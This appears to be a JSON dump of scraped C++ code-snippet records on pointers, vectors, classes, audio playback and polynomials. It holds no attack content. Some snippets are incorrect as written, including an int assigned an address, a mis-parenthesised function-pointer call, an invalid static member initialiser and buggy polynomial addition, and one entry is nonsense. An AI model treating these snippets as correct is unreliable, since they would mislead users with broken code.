    "title": " platform io change baud rate",
    "description": "// In the file platformio.ini add:  monitor_speed = baudRate  // For example:  monitor_speed = 115200\n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3280,
    "keyword": null,
    "link": null,
    "title": " play alarm in c++",
    "description": "cout << '\\a';\n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3281,
    "keyword": null,
    "link": null,
    "title": " play audio c++",
    "description": "mciSendString(\"open \\\"*.mp3\\\" type mpegvideo alias mp3\", NULL, 0, NULL); \n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3282,
    "keyword": null,
    "link": null,
    "title": " pneumonia",
    "description": "salut\njust dont get it\n#include <iostream>   int main()  {   std::cout << \"LIFE =< gapron\";   return 0;    }\n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3283,
    "keyword": null,
    "link": null,
    "title": " point class in c++",
    "description": "/*   Examples of classes, inheritance, overloading, overriding,      static binding, and dynamic binding   with classes Point2D and Point3D.    Not an example of polymorphism. */  #include <iostream> #include <cmath>  using namespace std;  /*   Base class Point2D represents a point in two dimensional space */ class Point2D {    public:      /*     Static data members have to be initialized when declared.     Static data memebers are usually declared const (constant),      because the values should not be changed (Principle of Least Privilege)   */   static const double ZERO = 0.0;      /*     Overloaded constructor with zero parameters   */   Point2D(){     //initialize the data members     x = ZERO;     y = ZERO;     //cout<<*this<<endl;   }      /*     Overloaded constructor with two parameters   */   Point2D(double x2, double y2){     //initialize the data members     x = x2;     y = y2;     //cout<<*this<<endl;   }       //set (mutator) functions   void setX(double x2){     x = x2;   }    void setY(double y2){     y = y2;   }    //get (accessor) functions      double getX(){     return x;    }    double getY(){     return y;   }    /*     Returns the distance from point (0,0).     Can be the magnitude of a vector or length of a line.   */   double distance(){     return sqrt(x*x + y*y);   }    //friend function for overloading output operator<<()   friend ostream & operator<<(ostream & output, const Point2D & point){     output<<\"(\"<<point.x<<\", \"<<point.y<<\")\";     return output;   }                        //data members represent two points in space protected:   double x;    double y;       };  /*   Derived class Point3D represents a podouble in three dimensional space */ class Point3D:public Point2D {    public:   /*     Overloaded constructor with zero parameters   */   Point3D():Point2D(){     //initialize data member     z = ZERO;     //cout<<*this<<endl;   }      /*     Overloaded constructor with three parameters   */   Point3D(double x2, double y2, double z2):Point2D(x2,y2){     //initialize data member     z = z2;     //cout<<*this<<endl;   }       //set (mutator) functions   void setZ(double z2){     z = z2;   }    //get (accessor) functions          double getZ(){     return z;   }    //overridden function, returns the distance from point (0,0,0)   double distance(){     return sqrt(x*x + y*y + z*z);   }    //friend function for overloading output operator<<()   friend ostream & operator<<(ostream & output, const Point3D & point){     output<<\"(\"<<point.x<<\", \"<<point.y<<\", \"<<point.z<<\")\";     return output;   }              /*     Data members represent three points in space.     Points x and y are inherited from Point2D.   */ protected:   double z;                    };  //driver function to test classes int main(){   Point3D point(3, 4, 5);   cout<<\"point = \"<<point<<endl;   //function distance() returns 7.07107   cout<<point.distance()<<endl;      //pointer2D points to point   Point2D *pointer2D = &point;    cout<<\"*pointer2D = \"<<*pointer2D<<endl;   //function distance() incorrectly returns 5.0   cout<<pointer2D->distance()<<endl;      //pointer3D points to point   Point3D *pointer3D = &point;    cout<<\"*pointer3D = \"<<*pointer3D<<endl;   //function distance() returns 7.07107   cout<<pointer3D->distance()<<endl;       return 0; }  /* point = (3, 4, 5) 7.07107 *pointer2D = (3, 4) 5 *pointer3D = (3, 4, 5) 7.07107  */    \n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3284,
    "keyword": null,
    "link": null,
    "title": " pointer",
    "description": "Variable is used to store value Pointer is used to store addresss of value\n/* **use of pointers is that here even if we change the value of c since the adderss is * of c is assigned to pc it *pc will also get modified*/ int* pc, c; c = 5; pc = &c; *pc = 1; printf(\"%d\", *pc);  // Ouptut: 1 printf(\"%d\", c);    // Output: 1 \nAs discussed earlier, 'p' is a pointer to 'a'. Since 'a' has a value of 10, so '*p' is 10. 'p' stores the address of a. So the output p = 0xffff377c implies that 0xffff377c is the address of 'a'. '&p' represents the address of 'p' which is 0xffff3778. Now, '*&p' is the value of '&p' and the value of '&p' is the address of 'a'. So, it is 0xffff377c.\n#include <iostream>  float average(float a[]) {     int i;     float avg, sum=0;     for(i=0;i<8;++i)     {         sum+= a[i];     }     avg = sum/8;     return avg; }  int main(){ \tfloat b, n[ ] = { 20.6, 30.8, 5.1, 67.2, 23, 2.9, 4, 8 }; \tb = average(n);   \tstd:: cout << \"Average of numbers = \" << b << std::endl; \treturn 0; } \n#include <iostream> // by using increment sign we know whole array int main() { \tusing namespace std; \tint ar[] = { 1,2,3,4,5,6,7,8,9,10 }; \tfor (int m : ar) \t{ \t\tcout << m << endl; \t} \treturn 0; } \np = 0xffff377c *p = 10 &p = 0xffff3778 *&p = 0xffff377c\nSize of arr[] 24 Size of ptr 4\n",
    "reg_date": "2021-10-12T11:42:32.000Z"
  },
  {
    "id": 3285,
    "keyword": null,
    "link": null,
    "title": " pointer address to string",
    "description": "#include <sstream> //for std::stringstream  #include <string>  //for std::string  const void * address = static_cast<const void*>(this); std::stringstream ss; ss << address;   std::string name = ss.str();\n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3286,
    "keyword": null,
    "link": null,
    "title": " pointer c++",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\nint myvar = 6; int pointer = &myvar; // adress of myvar int value = *pointer; // the value the pointer points to: 6\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\n#include <iostream>  using namespace std; // isualize this on http://pythontutor.com/cpp.html#mode=edit int main() {    double* account_pointer = new double;    *account_pointer = 1000;    cout << \"Allocated one new variable containing \" << *account_pointer       << endl;    cout << endl;     int n = 10;    double* account_array = new double[n];    for (int i = 0; i < n; i++)    {       account_array[i] = 1000 * i;    }       cout << \"Allocated an array of size \" << n << endl;    for (int i = 0; i < n; i++)    {       cout << i << \": \" << account_array[i] << endl;    }    cout << endl;     // Doubling the array capacity     double* bigger_array = new double[2 * n];    for (int i = 0; i < n; i++)    {       bigger_array[i] = account_array[i];    }    delete[] account_array; // Deleting smaller array    account_array = bigger_array;    n = 2 * n;     cout << \"Now there is room for an additional element:\" << endl;    account_array[10] = 10000;    cout << 10 << \": \" << account_array[10] << endl;            delete account_pointer;    delete[] account_array; // Deleting larger array        return 0; }\n// my first pointer #include <iostream> using namespace std;  int main () {   int firstvalue, secondvalue;   int * mypointer; //creates pointer variable of type int    mypointer = &firstvalue;   *mypointer = 10;   mypointer = &secondvalue;   *mypointer = 20;   cout << \"firstvalue is \" << firstvalue << '\\n';   //firstvalue is 10   cout << \"secondvalue is \" << secondvalue << '\\n'; //secondvalue is 20   return 0; }\n#include <iostream> using std::cout;  int main() {   /*    Some things to keep in mind:   \t-you shouldn't circumvent the type system if you are creating raw ptrs   \tand don't need to \"type pun\" or cast (don't use void ptrs)     -ptr types only reference memory (which are integers), not actual data, thus     they should not be treated as data types     char* is just 1 byte of mem, int* is just 4 bytes of mem, etc     - '*' means that you are creating a pointer which \"points\" to the mem address     of a variable     - '&', in this case, means \"get the mem address of this variable\"   */      void* ptr; // a pointer that doesn't reference a certain size of memory   int* int_ptr; // a pointer that points to data with   \t\t\t\t// only 4 bytes of memory (on stack)      int a = 5; // allocates 4 bytes of mem and stores \"5\" there (as a primitive)   ptr = &a; // can only access the memory address of 'a' (not the data there)      int b = 45;    int_ptr = &b; // can access both memory address and data of 'b'      cout << ptr << \"\\n\"; // prints mem address of 'a'   /*cout << *ptr << \"\\n\"; <- this will error out; a void ptr cannot be    \t\t\t\t\t\t\t derefrenced */   cout << *(int*)ptr << \"\\n\"; // type punning to get around void ptr (extra work)      cout << int_ptr << \"\\n\"; // mem address of b   cout << *int_ptr << \"\\n\"; // data stored at b      /* -- OUTPUTS -- */   /*   \tsome memory address (arbitrary) which contains 05 00 00 00 as its data   \t5     some memory address (arbitrary) which contains 2D 00 00 00 as its data     45   */      return 0; // you only need this if \"main\" isnt the linker entry point   \t\t\t// you also don't care      // ur also probably wondering why I didn't using namespace std... cherno }\n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3287,
    "keyword": null,
    "link": null,
    "title": " pointer dereference",
    "description": "int number; int value; int * pNumber;  number = 5; pNumber = &number;  assert(pNumber); // check before dereferenceing to prevent errors value = *pNumber // Use * to dereference the pointer\nint x = 5; int *p = &x;  x = x + 4; x = *p + 4; *p = *p + 4; cout << x; //Output is 17\nvalue = *pointer // Use * to dereference the pointer\n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3288,
    "keyword": null,
    "link": null,
    "title": " pointer in c++",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\n#include <iostream>  using namespace std; // isualize this on http://pythontutor.com/cpp.html#mode=edit int main() {    double* account_pointer = new double;    *account_pointer = 1000;    cout << \"Allocated one new variable containing \" << *account_pointer       << endl;    cout << endl;     int n = 10;    double* account_array = new double[n];    for (int i = 0; i < n; i++)    {       account_array[i] = 1000 * i;    }       cout << \"Allocated an array of size \" << n << endl;    for (int i = 0; i < n; i++)    {       cout << i << \": \" << account_array[i] << endl;    }    cout << endl;     // Doubling the array capacity     double* bigger_array = new double[2 * n];    for (int i = 0; i < n; i++)    {       bigger_array[i] = account_array[i];    }    delete[] account_array; // Deleting smaller array    account_array = bigger_array;    n = 2 * n;     cout << \"Now there is room for an additional element:\" << endl;    account_array[10] = 10000;    cout << 10 << \": \" << account_array[10] << endl;            delete account_pointer;    delete[] account_array; // Deleting larger array        return 0; }\n// Variable is used to store value int a = 5; cout << a; //output is 5  // Pointer is used to store address of variable int a = 5; int *ab; ab = &a; //& is used get address of the variable cout << ab; // Output is address of variable\n#include <iostream> using std::cout;  int main() {   /*    Some things to keep in mind:   \t-you shouldn't circumvent the type system if you are creating raw ptrs   \tand don't need to \"type pun\" or cast (don't use void ptrs)     -ptr types only reference memory (which are integers), not actual data, thus     they should not be treated as data types     char* is just 1 byte of mem, int* is just 4 bytes of mem, etc     - '*' means that you are creating a pointer which \"points\" to the mem address     of a variable     - '&', in this case, means \"get the mem address of this variable\"   */      void* ptr; // a pointer that doesn't reference a certain size of memory   int* int_ptr; // a pointer that points to data with   \t\t\t\t// only 4 bytes of memory (on stack)      int a = 5; // allocates 4 bytes of mem and stores \"5\" there (as a primitive)   ptr = &a; // can only access the memory address of 'a' (not the data there)      int b = 45;    int_ptr = &b; // can access both memory address and data of 'b'      cout << ptr << \"\\n\"; // prints mem address of 'a'   /*cout << *ptr << \"\\n\"; <- this will error out; a void ptr cannot be    \t\t\t\t\t\t\t derefrenced */   cout << *(int*)ptr << \"\\n\"; // type punning to get around void ptr (extra work)      cout << int_ptr << \"\\n\"; // mem address of b   cout << *int_ptr << \"\\n\"; // data stored at b      /* -- OUTPUTS -- */   /*   \tsome memory address (arbitrary) which contains 05 00 00 00 as its data   \t5     some memory address (arbitrary) which contains 2D 00 00 00 as its data     45   */      return 0; // you only need this if \"main\" isnt the linker entry point   \t\t\t// you also don't care      // ur also probably wondering why I didn't using namespace std... cherno }\nint* pointVar, var; var = 5;  // assign address of var to pointVar pointVar = &var;  // access value pointed by pointVar cout << *pointVar << endl;   // Output: 5  In the above code, the address of var is assigned to the pointVar pointer. We have used the *pointVar to get the value stored in that address.\n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3289,
    "keyword": null,
    "link": null,
    "title": " pointer in cpp details",
    "description": "Every object in C++ has access to its own address through an important pointer called this pointer.  The this pointer is an implicit parameter to all member functions.  Therefore, inside a member function,  this may be used to refer to the invoking object.  Friend functions do not have a this pointer,  because friends are not members of a class.  Only member functions have a this pointer.\n#include <iostream> using std::cout;  int main() {   /*    Some things to keep in mind:   \t-you shouldn't circumvent the type system if you are creating raw ptrs   \tand don't need to \"type pun\" or cast (don't use void ptrs)     -ptr types only reference memory (which are integers), not actual data, thus     they should not be treated as data types     char* is just 1 byte of mem, int* is just 4 bytes of mem, etc     - '*' means that you are creating a pointer which \"points\" to the mem address     of a variable     - '&', in this case, means \"get the mem address of this variable\"   */      void* ptr; // a pointer that doesn't reference a certain size of memory   int* int_ptr; // a pointer that points to data with   \t\t\t\t// only 4 bytes of memory (on stack)      int a = 5; // allocates 4 bytes of mem and stores \"5\" there (as a primitive)   ptr = &a; // can only access the memory address of 'a' (not the data there)      int b = 45;    int_ptr = &b; // can access both memory address and data of 'b'      cout << ptr << \"\\n\"; // prints mem address of 'a'   /*cout << *ptr << \"\\n\"; <- this will error out; a void ptr cannot be    \t\t\t\t\t\t\t derefrenced */   cout << *(int*)ptr << \"\\n\"; // type punning to get around void ptr (extra work)      cout << int_ptr << \"\\n\"; // mem address of b   cout << *int_ptr << \"\\n\"; // data stored at b      /* -- OUTPUTS -- */   /*   \tsome memory address (arbitrary) which contains 05 00 00 00 as its data   \t5     some memory address (arbitrary) which contains 2D 00 00 00 as its data     45   */      return 0; // you only need this if \"main\" isnt the linker entry point   \t\t\t// you also don't care      // ur also probably wondering why I didn't using namespace std... cherno }\n#include <iostream> using namespace std; class Demo { private:   int num;   char ch; public:   void setMyValues(int num, char ch){     this->num =num;     this->ch=ch;   }   void displayMyValues(){     cout<<num<<endl;     cout<<ch;   } }; int main(){   Demo obj;   obj.setMyValues(100, 'A');   obj.displayMyValues();   return 0; }\n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3290,
    "keyword": null,
    "link": null,
    "title": " pointer questions c++",
    "description": "#include<iostream> using namespace std;  int main() {     int x;     cout << \"Enter a number\\n\";     cin >> x;     cout << *(&x) << \"\\n\";     return 0; }\t\t\t\t\t\t\t\t\t \n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3291,
    "keyword": null,
    "link": null,
    "title": " pointer to constant",
    "description": "#include<iostream>  int main() {\t \tint number_1{100};     int number_2 {200};          //the data(value) pointed by the pointer is constant  \tconst int *some_ptr {&number_1};     *some_ptr = 300 ; //Error     *some_ptr = &number_2 ; // ok => the aderss is different       \t//the adress pointed by the pointer is constant    \tint *const some_ptr {&number_1} ;   \tsome_ptr = &number_2 //error => the adress of the pointer is constant      *some_ptr = 123 // ok           // the adress and the data is constant     \tconst int const *some_ptr{&number_1};   \t*some_ptr = 32; // error \tsome_ptr = &number_2; // error            return 0; }\n//the data(value) pointed by the pointer is constant  \tconst int *some_ptr {&number_1}; //the adress pointed by the pointer is constant    \tint *const some_ptr {&number1} ; \n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3292,
    "keyword": null,
    "link": null,
    "title": " pointers c++",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\nint myvar = 6; int pointer = &myvar; // adress of myvar int value = *pointer; // the value the pointer points to: 6\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\nvoid simple_pointer_examples() {     int   a;  // a can contain an integer \tint*  x;  // x can contain the memory address of an integer.   \tchar* y;  // y can contain the memory address of a char.   \tFoo*  z;  // z can contain the memory address of a Foo object.         a = 10;     x = &a;   // '&a' extracts address of a         std::cout <<  x << std::endl; // memory address of a => 0x7ffe9e25bffc     std::cout << *x << std::endl; //          value of a => 10 }\nbaz = *foo;\n// pointer to functions #include <iostream> using namespace std;  int addition (int a, int b) { return (a+b); }  int subtraction (int a, int b) { return (a-b); }  int operation (int x, int y, int (*functocall)(int,int)) {   int g;   g = (*functocall)(x,y);   return (g); }  int main () {   int m,n;   int (*minus)(int,int) = subtraction;    m = operation (7, 5, addition);   n = operation (20, m, minus);   cout <<n;   return 0; }\n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3293,
    "keyword": null,
    "link": null,
    "title": " pointers in c++",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\nint myvar = 6; int pointer = &myvar; // adress of myvar int value = *pointer; // the value the pointer points to: 6\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\nvoid simple_pointer_examples() {     int   a;  // a can contain an integer \tint*  x;  // x can contain the memory address of an integer.   \tchar* y;  // y can contain the memory address of a char.   \tFoo*  z;  // z can contain the memory address of a Foo object.         a = 10;     x = &a;   // '&a' extracts address of a         std::cout <<  x << std::endl; // memory address of a => 0x7ffe9e25bffc     std::cout << *x << std::endl; //          value of a => 10 }\nEvery object in C++ has access to its own address through an important pointer called this pointer.  The this pointer is an implicit parameter to all member functions.  Therefore, inside a member function,  this may be used to refer to the invoking object.  Friend functions do not have a this pointer,  because friends are not members of a class.  Only member functions have a this pointer.\nvoid one() { cout << \"One\\n\"; } void two() { cout << \"Two\\n\"; }   int main() { \tvoid (*fptr)(); //Declare a function pointer to voids with no params  \tfptr = &one; //fptr -> one \t*fptr(); //=> one()  \tfptr = &two; //fptr -> two \t*fptr(); //=> two()  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:42:33.000Z"
  },
  {
    "id": 3294,
    "keyword": null,
    "link": null,
    "title": " pointers in cpp",
    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\nint myvar = 6; int pointer = &myvar; // adress of myvar int value = *pointer; // the value the pointer points to: 6\n#include <iostream>  using namespace std;  int main () {    int  var = 20;   // actual variable declaration.    int  *ip;        // pointer variable      ip = &var;       // store address of var in pointer variable     cout << \"Value of var variable: \";     cout << var << endl; //Prints \"20\"     // print the address stored in ip pointer variable    cout << \"Address stored in ip variable: \";    cout << ip << endl; //Prints \"b7f8yufs78fds\"     // access the value at the address available in pointer    cout << \"Value of *ip variable: \";    cout << *ip << endl; //Prints \"20\"     return 0; }\nEvery object in C++ has access to its own address through an important pointer called this pointer.  The this pointer is an implicit parameter to all member functions.  Therefore, inside a member function,  this may be used to refer to the invoking object.  Friend functions do not have a this pointer,  because friends are not members of a class.  Only member functions have a this pointer.\nvoid one() { cout << \"One\\n\"; } void two() { cout << \"Two\\n\"; }   int main() { \tvoid (*fptr)(); //Declare a function pointer to voids with no params  \tfptr = &one; //fptr -> one \t*fptr(); //=> one()  \tfptr = &two; //fptr -> two \t*fptr(); //=> two()  \treturn 0; } \n#include <iostream> using std::cout;  int main() {   /*    Some things to keep in mind:   \t-you shouldn't circumvent the type system if you are creating raw ptrs   \tand don't need to \"type pun\" or cast (don't use void ptrs)     -ptr types only reference memory (which are integers), not actual data, thus     they should not be treated as data types     char* is just 1 byte of mem, int* is just 4 bytes of mem, etc     - '*' means that you are creating a pointer which \"points\" to the mem address     of a variable     - '&', in this case, means \"get the mem address of this variable\"   */      void* ptr; // a pointer that doesn't reference a certain size of memory   int* int_ptr; // a pointer that points to data with   \t\t\t\t// only 4 bytes of memory (on stack)      int a = 5; // allocates 4 bytes of mem and stores \"5\" there (as a primitive)   ptr = &a; // can only access the memory address of 'a' (not the data there)      int b = 45;    int_ptr = &b; // can access both memory address and data of 'b'      cout << ptr << \"\\n\"; // prints mem address of 'a'   /*cout << *ptr << \"\\n\"; <- this will error out; a void ptr cannot be    \t\t\t\t\t\t\t derefrenced */   cout << *(int*)ptr << \"\\n\"; // type punning to get around void ptr (extra work)      cout << int_ptr << \"\\n\"; // mem address of b   cout << *int_ptr << \"\\n\"; // data stored at b      /* -- OUTPUTS -- */   /*   \tsome memory address (arbitrary) which contains 05 00 00 00 as its data   \t5     some memory address (arbitrary) which contains 2D 00 00 00 as its data     45   */      return 0; // you only need this if \"main\" isnt the linker entry point   \t\t\t// you also don't care      // ur also probably wondering why I didn't using namespace std... cherno }\n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3295,
    "keyword": null,
    "link": null,
    "title": " pointers mcq sanfoundry",
    "description": "    #include <iostream>\n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3296,
    "keyword": null,
    "link": null,
    "title": " pointers to pointers in cpp",
    "description": "#include <iostream>   using namespace std;   int main () {    int  var;    int  *ptr;    int  **pptr;     var = 3000;     // take the address of var    ptr = &var;     // take the address of ptr using address of operator &    pptr = &ptr;     // take the value using pptr    cout << \"Value of var :\" << var << endl;    cout << \"Value available at *ptr :\" << *ptr << endl;    cout << \"Value available at **pptr :\" << **pptr << endl;     return 0; }\n#include <iostream> using std::cout;  int main() {   /*    Some things to keep in mind:   \t-you shouldn't circumvent the type system if you are creating raw ptrs   \tand don't need to \"type pun\" or cast (don't use void ptrs)     -ptr types only reference memory (which are integers), not actual data, thus     they should not be treated as data types     char* is just 1 byte of mem, int* is just 4 bytes of mem, etc     - '*' means that you are creating a pointer which \"points\" to the mem address     of a variable     - '&', in this case, means \"get the mem address of this variable\"   */      void* ptr; // a pointer that doesn't reference a certain size of memory   int* int_ptr; // a pointer that points to data with   \t\t\t\t// only 4 bytes of memory (on stack)      int a = 5; // allocates 4 bytes of mem and stores \"5\" there (as a primitive)   ptr = &a; // can only access the memory address of 'a' (not the data there)      int b = 45;    int_ptr = &b; // can access both memory address and data of 'b'      cout << ptr << \"\\n\"; // prints mem address of 'a'   /*cout << *ptr << \"\\n\"; <- this will error out; a void ptr cannot be    \t\t\t\t\t\t\t derefrenced */   cout << *(int*)ptr << \"\\n\"; // type punning to get around void ptr (extra work)      cout << int_ptr << \"\\n\"; // mem address of b   cout << *int_ptr << \"\\n\"; // data stored at b      /* -- OUTPUTS -- */   /*   \tsome memory address (arbitrary) which contains 05 00 00 00 as its data   \t5     some memory address (arbitrary) which contains 2D 00 00 00 as its data     45   */      return 0; // you only need this if \"main\" isnt the linker entry point   \t\t\t// you also don't care      // ur also probably wondering why I didn't using namespace std... cherno }\n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3297,
    "keyword": null,
    "link": null,
    "title": " pointers vs references in c++",
    "description": "#include<iostream>  /* Pointers: *ptr, point to the memory location of a variable int a = 10 int *ptr = &a //points to the location in memory (0x80ea or whatever)  instead of the value  in order for pointers to work, the variable it's pointing to needs to  be de-referenced using &.(If confused, remember that the variable, int a,  is itself a reference to the location of the value you set it to).  A reference variable: &ref, points to another variable.  int b = 20; int &ref = b // points to the value of b, which is 20.  run this if confused: */      int a = 10;     int *ptr = &a;     std::cout << \"int a value: \" << a << std::endl;     std::cout << \"int ptr value: \" << ptr << std::endl;      int b = 20;     int& ref = b;     std::cout << \"int b value: \" << b << std::endl;     std::cout << \"int ref value: \" << ref << std::endl;      ref = a;     std::cout << \"int ref after setting it equal to a: \" << ref << std::endl;     ref = *ptr;     std::cout << \"int ref after setting it equal to *ptr: \" << ref << std::endl;     ptr = &ref;     std::cout << \"ptr after setting it equal to &ref: \" << ptr << std::endl;      ptr = &b;     std::cout << \"ptr after setting it equal to &b: \" << ptr << std::endl;  /* Reference variables CANNOT be set to a pointer variable; In the case above, you  see we can't just put ref = ptr; ptr HAS to be dereferenced with a *, which in  turn will give us the value of a, or 10. (dereference pointers with *)  Same goes for pointer variables being set to a reference; you have to dereference  the reference value (ptr = &b instead of ptr = b;). In the block above, when we  set ptr = &ref, the ref variable is dereferenced showing us a memory location.  When ptr=&b is called and we see the output, we noticed it is the same as the previous  output. */\nPointers:  A pointer is a variable that holds memory address of another variable.  A pointer needs to be dereferenced with * operator to access the  memory location it points to.   References :  A reference variable is an alias, that is,  another name for an already existing variable.  A reference, like a pointer, is also implemented  by storing the address of an object. \n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3298,
    "keyword": null,
    "link": null,
    "title": " pointeur cpp",
    "description": "typedef int (Class:: *ptr)(int); ptr _list_func;\n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3299,
    "keyword": null,
    "link": null,
    "title": " polynomial operations using c++",
    "description": "//Addition of Two Polynomial  #include <iostream.h> #include <iomanip.h> #include <conio.h>  struct poly{     int coeff;     int pow;     poly *next; };  class add2poly {    poly *poly1, *poly2, *poly3;    public:    add2poly(){poly1=poly2=poly3=NULL;}    void addpoly();    void display(); };  void add2poly :: addpoly(){       int i,p;       poly *newl=NULL,*end=NULL;       cout<<\"Enter highest power for x\\n\";       cin>>p;     //Read first poly       cout<<\"\\nFirst Polynomial\\n\";       for(i=p;i>=0;i--)       {       newl=new poly;       newl->pow=p;       cout<<\"Enter Co-efficient for degree\"<<i<<\"::  \";       cin>>newl->coeff;       newl->next=NULL;       if(poly1==NULL)          poly1=newl;       else          end->next=newl;       end=newl;       }      //Read Second poly       cout<<\"\\n\\nSecond Polynomial\\n\";       end=NULL;       for(i=p;i>=0;i--)       {       newl=new poly;       newl->pow=p;       cout<<\"Enter Co-efficient for degree\"<<i<<\"::  \";       cin>>newl->coeff;       newl->next=NULL;       if(poly2==NULL)          poly2=newl;       else          end->next=newl;       end=newl;       }        //Addition Logic       poly *p1=poly1,*p2=poly2;       end=NULL;       while(p1 !=NULL && p2!=NULL){         if(p1->pow == p2->pow){             newl=new poly;             newl->pow=p--;             newl->coeff=p1->coeff + p2->coeff;             newl->next=NULL;             if(poly3==NULL)                poly3=newl;             else                end->next=newl;             end=newl;         }         p1=p1->next;         p2=p2->next;       } }  void add2poly :: display(){    poly *t=poly3;    cout<<\"\\n\\nAnswer after addition is : \";    while(t!=NULL){       cout.setf(ios::showpos);       cout<<t->coeff;       cout.unsetf(ios::showpos);       cout<<\"X\"<<t->pow;       t=t->next;    } }   void main(){     clrscr();     add2poly obj;     obj.addpoly();     obj.display();     getch(); }\n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3300,
    "keyword": null,
    "link": null,
    "title": " pop back",
    "description": "// vector::pop_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int sum (0);   myvector.push_back (100);   myvector.push_back (200);   myvector.push_back (300);    while (!myvector.empty())   {     sum+=myvector.back();     myvector.pop_back();   }    std::cout << \"The elements of myvector add up to \" << sum << '\\n';    return 0; }\n#include <bits/stdc++.h>  using namespace std; int main(){     vector<int> v1{10, 20, 30, 40, 50};          //removing elemenets     v1.pop_back();  //removes 50     v1.pop_back();  //removes 40  }\nRemoves the last element of the vector\n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3301,
    "keyword": null,
    "link": null,
    "title": " pop off end of string c++",
    "description": "#include <string>  int main() {  std::string str = \"Hello, World!\";  str.pop_back(); // str is now \"Hello, World\" }\n",
    "reg_date": "2021-10-12T11:42:34.000Z"
  },
  {
    "id": 3302,
    "keyword": null,
    "link": null,
    "title": " popualte an array c++",
    "description": " const int arraysize = 10;     int a[arraysize] = {1, 2, 3, 6, 8, 5, 5, 0, 2, 7};     int b[arraysize] = {1, 2, 3};     int c[arraysize] = {};       for(int i = 0; i < arraysize; ++i) {         std::cout << a[i] << ' ' << b[i] << ' ' << c[i] << std::endl;     }  This outputs  1 1 0 2 2 0 3 3 0 6 0 0 8 0 0 5 0 0 5 0 0 0 0 0  2 0 0  7 0 0 \n",
    "reg_date": "2021-10-12T11:42:35.000Z"
  },
  {
    "id": 3303,
    "keyword": null,
    "link": null,
    "title": " position of array in c++",
